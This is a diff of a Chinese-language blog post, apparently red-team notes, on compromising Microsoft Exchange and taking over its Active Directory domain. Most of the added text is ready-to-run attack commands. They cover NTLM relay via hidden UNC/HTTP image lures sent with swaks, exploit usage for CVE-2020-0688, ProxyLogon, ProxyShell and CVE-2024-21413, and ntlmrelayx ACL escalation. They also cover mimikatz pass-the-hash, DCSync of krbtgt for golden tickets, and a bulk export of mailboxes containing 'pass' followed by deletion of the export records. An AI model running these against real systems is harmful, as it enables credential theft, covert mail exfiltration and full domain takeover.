-<h4 id="Relay到ews接口"><a href="#Relay到ews接口" class="headerlink" title="Relay到ews接口"></a>Relay到ews接口</h4><blockquote>
+<h3 id="Relay到ews接口"><a href="#Relay到ews接口" class="headerlink" title="Relay到ews接口"></a>Relay到ews接口</h3><blockquote>
 <p>由于EWS接口也支持NTML SSP，可以Relay到EWS接口实现收发邮件和代理等操作，在使用Outlook的情况下还可以尝试滥用Outlook功能达到命令执行的效果。虽然Exchange开放在公网的情况不在少数，可以尝试在外网发起Relay，但是大多数情况都需要在内网。</p>
 <ul>
 <li>UNC协议</li>
@@ -759,8 +641,17 @@
 </blockquote>
 <ul>
 <li>UNC协议默认携带凭证(但是大多数情况都是不支持访问公网445的)</li>
+<li>HTTP 默认不会发起 NTLM 认证，即使服务端对其进行 NTLM 挑战，除非服务端 url 位于服务器的信任网站或内联网列表。Windows 会认为 <a target="_blank" rel="noopener" href="http://netbios/">http://Netbios</a> 形式的 url 处于内联网，域内用户默认有增加 DNS 记录的权限，因此攻击者需要先获取域用户权限并创建 DNS 记录来将恶意服务器”放入”内联网列表。</li>
 </ul>
-<h5 id="ExchangeRelayX"><a href="#ExchangeRelayX" class="headerlink" title="ExchangeRelayX"></a>ExchangeRelayX</h5><blockquote>
+<h4 id="发送邮件"><a href="#发送邮件" class="headerlink" title="发送邮件"></a>发送邮件</h4><h5 id="手动发送"><a href="#手动发送" class="headerlink" title="手动发送"></a>手动发送</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在发送的邮件中插入以下任一格式</span></span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;\192.168.60.172\blank&quot;</span>&gt;</span><br><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;http://relayubuntu/blank&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="awaks"><a href="#awaks" class="headerlink" title="awaks"></a>awaks</h5><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 发送带 UNC 路径的邮件</span></span><br><span class="line"><span class="string">swaks </span><span class="built_in">--server</span> <span class="string">192.</span><span class="string">168.</span><span class="string">60.</span><span class="string">116 </span><span class="built_in">--ehlo</span> <span class="string">island.</span><span class="string">com </span><span class="built_in">--to</span> <span class="string">zhangsan@</span><span class="string">island.</span><span class="string">com </span><span class="built_in">--from</span> <span class="string">test@</span><span class="string">island.</span><span class="string">com </span><span class="built_in">--header</span> <span class="string">&quot;Subject:relay_swaks_test&quot;</span> <span class="built_in">--body</span> <span class="string">&#x27;&lt;img src=&quot;\192.168.60.172blank&quot; style=&quot;display:none&quot;&gt;this is a msg&#x27;</span> <span class="built_in">--h-X-Mailer:</span> <span class="string">&#x27;Foxmail 7.2.20.273[cn]&#x27;</span> <span class="built_in">--add-header</span> <span class="string">&quot;Content-Type: text/html&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送带 HTTP 路径的邮件</span></span><br><span class="line"><span class="string">swaks </span><span class="built_in">--server</span> <span class="string">192.</span><span class="string">168.</span><span class="string">60.</span><span class="string">116 </span><span class="built_in">--ehlo</span> <span class="string">island.</span><span class="string">com </span><span class="built_in">--to</span> <span class="string">zhangsan@</span><span class="string">island.</span><span class="string">com </span><span class="built_in">--from</span> <span class="string">test@</span><span class="string">island.</span><span class="string">com </span><span class="built_in">--header</span> <span class="string">&quot;Subject:relay_swaks_test&quot;</span> <span class="built_in">--body</span> <span class="string">&#x27;&lt;img src=&quot;http://relayubuntu/blank&quot; style=&quot;display:none&quot;&gt;this is a msg&#x27;</span> <span class="built_in">--h-X-Mailer:</span> <span class="string">&#x27;Foxmail 7.2.20.273[cn]&#x27;</span> <span class="built_in">--add-header</span> <span class="string">&quot;Content-Type: text/html&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Powermad Invoke-DNSUpdate.ps1</span></span><br><span class="line"><span class="comment"># 创建 DNS 记录</span></span><br><span class="line"><span class="string">Invoke-DNSUpdate </span>-<span class="string">DNSType </span>A -<span class="string">DNSName </span><span class="string">relayubuntu </span>-<span class="string">DNSData </span><span class="string">192.</span><span class="string">168.</span><span class="string">60.</span><span class="string">172</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="ExchangeRelayX"><a href="#ExchangeRelayX" class="headerlink" title="ExchangeRelayX"></a>ExchangeRelayX</h4><blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/quickbreach/ExchangeRelayX">ExchangeRelayX</a></p>
 <p>对本地 Microsoft Exchange 服务器上的 EWS 端点执行基于 SMB 或 HTTP 的 NTLM 中继攻击。该工具提供了一个类似于 OWA 的界面，可以访问用户的邮箱和联系人。</p>
 </blockquote>
@@ -786,11 +677,188 @@
 
 
 
-<h5 id="NtlmRelayToEWS"><a href="#NtlmRelayToEWS" class="headerlink" title="NtlmRelayToEWS"></a>NtlmRelayToEWS</h5><blockquote>
+<h4 id="NtlmRelayToEWS"><a href="#NtlmRelayToEWS" class="headerlink" title="NtlmRelayToEWS"></a>NtlmRelayToEWS</h4><blockquote>
 <p><a target="_blank" rel="noopener" href="https://github.com/Arno0x/NtlmRelayToEWS">NtlmRelayToEWS</a></p>
 <p>与 ExchangeRelayx 类似,可用于执行相同的攻击，但无需电子邮件接口.</p>
 </blockquote>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ntlmRelayToEWS.py -t https:<span class="regexp">//</span>owa.domain.com<span class="regexp">/EWS/</span>exchange.asmx -r sendMail -d <span class="string">&quot;Ian@pentest.local&quot;</span> -s Subject -m sampleMsg.html</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用上述方法发送邮件然后进行监听</span></span><br><span class="line">python2 ntlmRelayToEWS.py -t https:<span class="regexp">//</span>owa.domain.com<span class="regexp">/EWS/</span>exchange.asmx -r getFolder -f inbox -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者直接发送并监听</span></span><br><span class="line">python ntlmRelayToEWS.py -t https:<span class="regexp">//</span>owa.domain.com<span class="regexp">/EWS/</span>exchange.asmx -r sendMail -d <span class="string">&quot;Ian@pentest.local&quot;</span> -s Subject -m sampleMsg.html</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Relay-to-LDAP"><a href="#Relay-to-LDAP" class="headerlink" title="Relay to LDAP"></a>Relay to LDAP</h3><blockquote>
+<p>所有的 Exchange Server 都在 Exchange Windows Permissions 组里面, 而这个组默认就对域有 WriteACL 权限.</p>
+<p>因此我们可以 relay 到 LDAP, 而又由于 Relay 到的服务端是 Ldap,Ldap 服务器的默认策略是协商签名。而不是强制签名。是否签名由客户端决定。在 SSRF 里面发起的请求是 http 协议，http 协议是不要求进行签名.</p>
+<p>Exchange 机器账户对域分区拥有 WriteDacl 权限，直接通过 ACL 进行提权。</p>
+</blockquote>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 设定订阅</span><br><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">privexchange</span><span class="selector-class">.py</span> <span class="selector-tag">win2012-ex2016</span><span class="selector-class">.island</span><span class="selector-class">.com</span> <span class="selector-tag">-d</span> <span class="selector-tag">island</span><span class="selector-class">.com</span> <span class="selector-tag">-ah</span> 192<span class="selector-class">.168</span><span class="selector-class">.123</span><span class="selector-class">.123</span> <span class="selector-tag">-u</span> <span class="selector-tag">zhangsan</span> <span class="selector-tag">-p</span> <span class="selector-tag">ZS</span><span class="keyword">@123qwe</span> --debug</span><br><span class="line"></span><br><span class="line"># 内网机器上做中继，自动通过 ACL 进行提权</span><br><span class="line">python3 ntlmrelayx.py -t <span class="attribute">ldap:</span>//WIN2012-DC1.island.com --escalate-user zhangsan --no-dump</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h5 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h5><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/zcgonvh/CVE-2020-0688">CVE-2020-0688</a></p>
+<p>漏洞是由于Exchange服务器在安装时没有正确地创建唯一的加密密钥所造成的。</p>
+<ul>
+<li><p>Microsoft Exchange Server 2010 Service Pack 3</p>
+</li>
+<li><p>Microsoft Exchange Server 2013</p>
+</li>
+<li><p>Microsoft Exchange Server 2016</p>
+</li>
+<li><p>Microsoft Exchange Server 2019</p>
+</li>
+</ul>
+</blockquote>
+<ul>
+<li>检测</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExchangeDetect &lt;target&gt; &lt;user&gt; &lt;pass&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExchangeCmd &lt;target&gt; &lt;user&gt; &lt;pass&gt; exec whoami</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="CVE-2020-17144"><a href="#CVE-2020-17144" class="headerlink" title="CVE-2020-17144"></a>CVE-2020-17144</h5><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/zcgonvh/CVE-2020-17144">CVE-2020-17144</a></p>
+<p>漏洞是由于Exchange服务器在安装时没有正确地创建唯一的加密密钥所造成的。</p>
+<ul>
+<li>Microsoft Exchange Server 2010 Service Pack 3 Update Rollup 31</li>
+<li>基本用不到了</li>
+</ul>
+</blockquote>
+<ul>
+<li>利用</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CVE-<span class="number">2020</span>-<span class="number">17144</span> &lt;target&gt; &lt;user&gt; &lt;pass&gt;</span><br><span class="line"></span><br><span class="line"># 成功以后访问这个内存马，注意<span class="number">80</span>，<span class="number">443</span>的问题</span><br><span class="line"><span class="function">http://<span class="title">owa.domain.com</span>/<span class="title">ews</span>/<span class="title">soap</span>/?<span class="title">pass</span>=<span class="title">whoami</span> </span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="CVE-2021-27065"><a href="#CVE-2021-27065" class="headerlink" title="CVE-2021-27065"></a>CVE-2021-27065</h5><h5 id="CVE-2024-21413"><a href="#CVE-2024-21413" class="headerlink" title="CVE-2024-21413"></a>CVE-2024-21413</h5><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git">CVE-2024-21413</a></p>
+<p>需要 SMTP 身份验证才能发送电子邮件，绕过 SPF、DKIM 和 DMARC 检查实现OutLook远程代码执行。</p>
+</blockquote>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">python </span><span class="string">CVE-2024-</span><span class="string">21413.</span><span class="string">py </span><span class="built_in">--server</span> <span class="string">&quot;&lt;SMTP server&gt;&quot;</span> <span class="built_in">--port</span> &lt;<span class="string">SMTP </span><span class="string">port&gt;</span> <span class="built_in">--username</span> <span class="string">&quot;&lt;SMTP username&gt;&quot;</span> <span class="built_in">--password</span> <span class="string">&quot;&lt;SMTP password&gt;&quot;</span> <span class="built_in">--sender</span> <span class="string">&quot;&lt;sender email&gt;&quot;</span> <span class="built_in">--recipient</span> <span class="string">&quot;&lt;recipient email&gt;&quot;</span> <span class="built_in">--url</span> <span class="string">&quot;&lt;link URL&gt;&quot;</span> <span class="built_in">--subject</span> <span class="string">&quot;&lt;email subject&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>–server：SMTP 服务器主机名或 IP。</li>
+<li>–port：SMTP 服务器端口。</li>
+<li>–username：用于验证的 SMTP 服务器用户名。</li>
+<li>–password：用于验证的 SMTP 服务器密码。</li>
+<li>–sender：发件人电子邮件地址。</li>
+<li>–recipient：收件人电子邮件地址。</li>
+<li>–url：包含在电子邮件中的恶意路径。</li>
+<li>–subject：电子邮件主题。</li>
+</ul>
+<blockquote>
+<p>后续再捕获NTLM Hash</p>
+</blockquote>
+<h5 id="ProxyLogon"><a href="#ProxyLogon" class="headerlink" title="ProxyLogon"></a>ProxyLogon</h5><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/hausec/ProxyLogon?tab=readme-ov-file">ProxyLogon</a>\<a target="_blank" rel="noopener" href="https://github.com/p0wershe11/ProxyLogon.git">ProxyLogon For Python3</a></p>
+<p>通过CVE-2021-26855的ssrf漏洞读取到邮箱用户的SID，通过有效SID结合CVE-2021-27065任意文件写入漏洞上传以.aspx结尾的文件，在其中插入一句话木马.</p>
+</blockquote>
+<blockquote>
+<ul>
+<li><p>Exchange Server 2019 &lt; 15.02.0792.010</p>
+</li>
+<li><p>Exchange Server 2019 &lt; 15.02.0721.013</p>
+</li>
+<li><p>Exchange Server 2016 &lt; 15.01.2106.013</p>
+</li>
+<li><p>Exchange Server 2013 &lt; 15.00.1497.012</p>
+</li>
+</ul>
+</blockquote>
+<ul>
+<li>目标 exchange 服务器必须为负载均衡服务器</li>
+<li>目标邮箱地址，需要为域内邮件地址而非邮箱地址(CVE-2021-26855)</li>
+<li>必须标识内部Exchange服务器的完全限定域名（FQDN）</li>
+</ul>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">proxylogon</span><span class="selector-class">.py</span> <span class="selector-tag">exchange</span><span class="selector-class">.com</span> <span class="selector-tag">admin</span><span class="keyword">@exchange</span>.com</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="proxyshell"><a href="#proxyshell" class="headerlink" title="proxyshell"></a>proxyshell</h5><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/ktecv2000/ProxyShell">proxyshell</a></p>
+<p>CVE-2021-34473、CVE-2021-31207、CVE-2021-34523组合利用实现rce</p>
+</blockquote>
+<blockquote>
+<ul>
+<li><p>Exchange Server 2013 Versions &lt; Builder 15.0.1497.012</p>
+</li>
+<li><p>Exchange Server 2016 CU18 &lt; Builder 15.1.2106.013</p>
+</li>
+<li><p>Exchange Server 2016 CU19 &lt; Builder 15.1.2176.009</p>
+</li>
+<li><p>Exchange Server 2019 CU7 &lt; Builder 15.2.0721.013</p>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone <span class="symbol">https:</span>/<span class="regexp">/github.com/ktecv</span>2000/ProxyShell</span><br><span class="line">cd ProxyShell</span><br><span class="line">virtualenv -p $(which python3) venv</span><br><span class="line">source venv/bin/activate</span><br><span class="line">pip3 install pypsrp</span><br><span class="line">cp wsman.py venv/<span class="class"><span class="keyword">lib</span>/*/<span class="title">site</span>-<span class="title">packages</span>/<span class="title">pypsrp</span>/<span class="title">wsman</span>.<span class="title">py</span></span></span><br><span class="line"></span><br><span class="line">exploit.py exchange.com admin@exchange.com</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="管理Exchange"><a href="#管理Exchange" class="headerlink" title="管理Exchange"></a>管理Exchange</h3><h4 id="高权限域账号"><a href="#高权限域账号" class="headerlink" title="高权限域账号"></a>高权限域账号</h4><blockquote>
+<p>通常创建 Exchange 的那个域账号会被加入 Exchange Organization Administrators 或 Organization Management 组（不同版本组名不同），如果拿到该组成员的凭证，可以使用 /PowerShell 接口对 Exchange 进行远程管理。</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置明文凭证并连接</span></span><br><span class="line"><span class="variable">$User</span> = <span class="string">&quot;island.com\enterprise_admin&quot;</span></span><br><span class="line"><span class="variable">$Pass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="literal">-AsPlainText</span> EA@<span class="number">123</span>qwe <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$Credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="literal">-ArgumentList</span> <span class="variable">$User</span>,<span class="variable">$Pass</span></span><br><span class="line"><span class="variable">$Session</span> = <span class="built_in">New-PSSession</span> <span class="literal">-ConfigurationName</span> Microsoft.Exchange <span class="literal">-ConnectionUri</span> https://win2012<span class="literal">-ex2016</span>.island.com/PowerShell <span class="literal">-Authentication</span> Kerberos <span class="literal">-Credential</span> <span class="variable">$Credential</span></span><br><span class="line"><span class="built_in">Import-PSSession</span> <span class="variable">$Session</span> <span class="literal">-AllowClobber</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试是否成功</span></span><br><span class="line"><span class="built_in">Get-Mailbox</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除连接</span></span><br><span class="line"><span class="built_in">Remove-PSSession</span> <span class="variable">$Session</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果只有Hash没有明文密码可使用mimikatz进行PTH</p>
+</blockquote>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;sekurlsa::pth /user:enterprise_admin /domain:island.com /ntlm:d81a42dfacbaf5e346eb9a072773309d /run:powershell&quot;</span> <span class="keyword">exit</span></span><br><span class="line"><span class="variable">$Session</span> = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri https:<span class="regexp">//</span>win2012-ex2016.island.com/PowerShell</span><br><span class="line">Import-PSSession <span class="variable">$Session</span> -AllowClobber</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="EX服务器权限"><a href="#EX服务器权限" class="headerlink" title="EX服务器权限"></a>EX服务器权限</h4><blockquote>
+<p>拿到服务器权限后，有两种方式对 Exchange 进行管理。</p>
+<ul>
+<li>通过 Exchange Management Shell 进行管理</li>
+<li>打开 Powershell 加载网络管理单元，不同版本 Exchange 加载语句不同</li>
+</ul>
+</blockquote>
+<h4 id="全局搜索"><a href="#全局搜索" class="headerlink" title="全局搜索"></a>全局搜索</h4><blockquote>
+<p>如果用户拥有 Mailbox Import Export 和 Mailbox Search 角色则可以使用搜索和导出相关的 Cmdlet，老版本 Exchange 中这两个角色默认没有分配给任何用户或角色组，包括 Organization Management 组。在实战中，通常需要先用 Organization Management 组用户登录管理接口，给自己赋予这两个角色，再重新连接自动从远程会话获取相应 Cmdlet。</p>
+</blockquote>
+<h5 id="PowerShell-查询"><a href="#PowerShell-查询" class="headerlink" title="PowerShell 查询"></a>PowerShell 查询</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 赋予角色，需要重新连接才能从远程会话获取相应 cmdlet</span></span><br><span class="line"><span class="built_in">New-ManagementRoleAssignment</span> <span class="literal">-Role</span> <span class="string">&quot;Mailbox Search&quot;</span> <span class="literal">-User</span> enterprise_admin</span><br><span class="line"><span class="built_in">New-ManagementRoleAssignment</span> <span class="literal">-Role</span> <span class="string">&quot;Mailbox Import Export&quot;</span> <span class="literal">-User</span> enterprise_admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除角色</span></span><br><span class="line"><span class="built_in">Remove-ManagementRoleAssignment</span> <span class="literal">-Identity</span> <span class="string">&quot;Mailbox Search-enterprise_admin&quot;</span> <span class="literal">-Confirm</span>:<span class="variable">$false</span></span><br><span class="line"><span class="built_in">Remove-ManagementRoleAssignment</span> <span class="literal">-Identity</span> <span class="string">&quot;Mailbox Import Export-enterprise_admin&quot;</span> <span class="literal">-Confirm</span>:<span class="variable">$false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出所有邮箱正文中带 pass 的邮件，localhost 为 Exchange 服务器</span></span><br><span class="line"><span class="built_in">Get-Mailbox</span> <span class="literal">-OrganizationalUnit</span> Users <span class="literal">-Resultsize</span> unlimited |%&#123;<span class="built_in">New-MailboxexportRequest</span> <span class="literal">-Mailbox</span> <span class="variable">$_</span>.name <span class="literal">-CompletedRequestAgeLimit</span> <span class="number">0</span> <span class="literal">-ContentFilter</span> &#123;(body <span class="operator">-like</span> <span class="string">&quot;*pass*&quot;</span>)&#125; <span class="literal">-FilePath</span> (<span class="string">&quot;\\localhost\c<span class="variable">$</span>\test\&quot;</span>+(<span class="variable">$_</span>.name)+<span class="string">&quot;.pst&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除导出记录，导出时不加 CompletedRequestAgeLimit 参数会留下导出记录</span></span><br><span class="line"><span class="built_in">Get-MailboxExportRequest</span>|<span class="built_in">Remove-MailboxExportRequest</span> <span class="literal">-Confirm</span>:<span class="variable">$false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索所有邮件，SearchQuery 只支持向后匹配，也可以匹配邮件其他位置比如收件人、发件人、CC 等</span></span><br><span class="line"><span class="built_in">Get-Mailbox</span> <span class="literal">-OrganizationalUnit</span> Users <span class="literal">-Resultsize</span> unlimited |%&#123;<span class="built_in">Search-Mailbox</span> <span class="literal">-Identity</span> <span class="variable">$_</span>.name <span class="literal">-SearchQuery</span> <span class="string">&quot;pass*&quot;</span> <span class="literal">-TargetMailbox</span> <span class="string">&quot;zhangsan&quot;</span> <span class="literal">-TargetFolder</span> <span class="string">&quot;outAll&quot;</span> <span class="literal">-LogLevel</span> Suppress&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="EWS-查询"><a href="#EWS-查询" class="headerlink" title="EWS 查询"></a>EWS 查询</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MailSniper.ps1</span></span><br><span class="line"><span class="comment"># 搜索所有邮件，需要提供管理员账号给用户授予 ApplicationImpersonation 权限</span></span><br><span class="line"><span class="attribute">Invoke</span>-GlobalMailSearch -Folder <span class="literal">all</span> -ImpersonationAccount enterprise_admin -ExchHostname win<span class="number">2012</span>-ex<span class="number">2016</span>.island.com -AdminUserName enterprise_admin -AdminPassword EA@<span class="number">123</span>qwe -MailsPerUser <span class="number">500</span> -Terms <span class="string">&quot;*password*&quot;</span>,<span class="string">&quot;*creds*&quot;</span>,<span class="string">&quot;*credentials*&quot;</span>,<span class="string">&quot;*测试*&quot;</span>,<span class="string">&quot;*密码*&quot;</span>,<span class="string">&quot;*拓扑*&quot;</span>,<span class="string">&quot;*运维*&quot;</span>,<span class="string">&quot;*VPN*&quot;</span>,<span class="string">&quot;*账号*&quot;</span> -OutputCsv global-email-search.csv</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="攻击域管"><a href="#攻击域管" class="headerlink" title="攻击域管"></a>攻击域管</h3><h4 id="ACL域提权"><a href="#ACL域提权" class="headerlink" title="ACL域提权"></a>ACL域提权</h4><blockquote>
+<p>所有的 Exchange Server 都在 Exchange Windows Permissions 组里面, 而这个组默认就对域有 WriteACL 权限, 那么当我们拿下 Exchange 服务器的时候, 就可以尝试使用 WriteACL 赋予自身 Dcsync 的权限.</p>
+</blockquote>
+<h5 id="已有Ex服务器权限"><a href="#已有Ex服务器权限" class="headerlink" title="已有Ex服务器权限"></a>已有Ex服务器权限</h5><blockquote>
+<ul>
+<li><p>已获取Exchange服务器权限</p>
+</li>
+<li><p>使用 powerview，为当前 exchange 机器名用户增加 dcsync 权限, 然后抓取 hash</p>
+</li>
+</ul>
+</blockquote>
+<figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># Powershell导入</span></span><br><span class="line"><span class="keyword">Import</span>-<span class="keyword">Module</span> ActiveDirectory</span><br><span class="line"><span class="keyword">Import</span>-<span class="keyword">Module</span> .\PowerView.ps1</span><br><span class="line"><span class="keyword">import</span>-<span class="keyword">module</span> .\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Add-ADGroupMember -Identity <span class="string">&quot;Exchange Trusted Subsystem&quot;</span> -Members test</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在另一台域内主机完成提权(第一次添加Exchang机器账户test到组需要重新登陆才能继承权限)</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登陆用户test</span></span><br><span class="line">echo <span class="number">123456789</span> | runas /user:test@f0x.com cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入密码后查看test所在组是否包含Exchange Trusted Subsystem组</span></span><br><span class="line">whoami /groups</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用mimikatz的DCSync功能导出用户krbtgt的hash</span></span><br><span class="line">mimikatz.exe privilege::debug <span class="string">&quot;lsadump::dcsync /domain:f0x.com /user:krbtgt /csv&quot;</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 制作金票登陆域</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="已有高权限域账号"><a href="#已有高权限域账号" class="headerlink" title="已有高权限域账号"></a>已有高权限域账号</h5><blockquote>
+<p><code>Exchange Organization Administrators</code> 或 <code>Organization Management</code> 组对 Exchange Windows Permissions 和 Exchange Trusted Subsystem 组拥有 <code>GenericAll</code> 权限，因此，如果获得了 <code>Organization Management</code> 组成员的权限，可以将任意账户添加至 <code>Exchange Windows Permissions</code> 或 <code>Exchange Trusted Subsystem</code> 组，进而继续通过上述方法提权。</p>
+</blockquote>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 查看 Organization Management 对 Exchange Windows Permissions 或 Exchange <span class="keyword">Trusted</span> Subsystem 有 GenericAll 权限</span><br><span class="line">AdFind.exe -h <span class="number">192.168</span><span class="number">.123</span><span class="number">.123</span> -b &quot;DC=island,DC=com&quot; -f &quot;|(name=Exchange Windows Permissions)(name=Exchange Trusted Subsystem)&quot; nTSecurityDescriptor -nosacl -sddl+++ -sddlfilter A;;FC;;;&quot;Organization Management&quot; -recmute</span><br><span class="line"></span><br><span class="line"># PowerView.ps1</span><br><span class="line"># 通过 Organization Management 组成员将任意用户添加至 Exchange Windows Permissions 或 Exchange <span class="keyword">Trusted</span> Subsystem</span><br><span class="line"># 当然，也可以将该组成员自身添加至 Exchange Windows Permissions 或 Exchange <span class="keyword">Trusted</span> Subsystem</span><br><span class="line"># <span class="keyword">Add</span>-DomainGroupMember 不支持域外指定域控</span><br><span class="line"><span class="keyword">Add</span>-DomainGroupMember -<span class="keyword">Identity</span> &quot;Exchange Windows Permissions&quot; -Members &quot;zhangsan&quot; -<span class="keyword">Verbose</span></span><br><span class="line"><span class="keyword">Get</span>-DomainGroupMember -DomainController <span class="number">192.168</span><span class="number">.123</span><span class="number">.123</span> -<span class="keyword">Domain</span> island.com -<span class="keyword">Identity</span> &quot;Exchange Windows Permissions&quot; -Recurse -<span class="keyword">Verbose</span></span><br><span class="line">Remove-DomainGroupMember -<span class="keyword">Identity</span> &quot;Exchange Windows Permissions&quot; -Members &quot;zhangsan&quot; -<span class="keyword">Verbose</span></span><br><span class="line"></span><br><span class="line"># 之后就跟 Exchange 机器账户利用方式一样，zhangsan 可以给别人添加 Dcsync 权限</span><br></pre></td></tr></table></figure>
+
+
 
 
 	  <div class="article-footer-copyright">
@@ -865,7 +933,7 @@
